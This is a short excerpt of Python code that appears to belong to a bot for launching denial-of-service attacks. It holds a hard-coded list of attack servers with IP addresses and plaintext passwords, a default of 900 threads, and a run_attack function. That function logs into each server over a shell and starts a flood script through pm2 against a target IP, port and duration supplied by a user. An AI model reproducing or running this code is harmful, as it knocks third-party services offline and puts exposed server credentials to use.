...
VPS_LIST = [
    ("master_knervnmtqz", "149.28.68.166", "T7hfTg46Y3XA"),
    ("master_ttqebyvvzf", "45.32.68.35", "M3rVZm2vj4b6"),
]
DEFAULT_THREADS = 900
user_cooldowns = {}
...
async def run_attack(ip, username, password, target_ip, port, duration, msg):
    try:
        ...
        value = "-1"  # ✅ yahan 5th argument value set karo
        shell.send(
            f"pm2 start runner.py --name {pname} --interpreter python3 --no-autorestart -- "
            f"{target_ip} {port} {duration} {DEFAULT_THREADS} {value}\n"
        )
        await asyncio.sleep(duration)
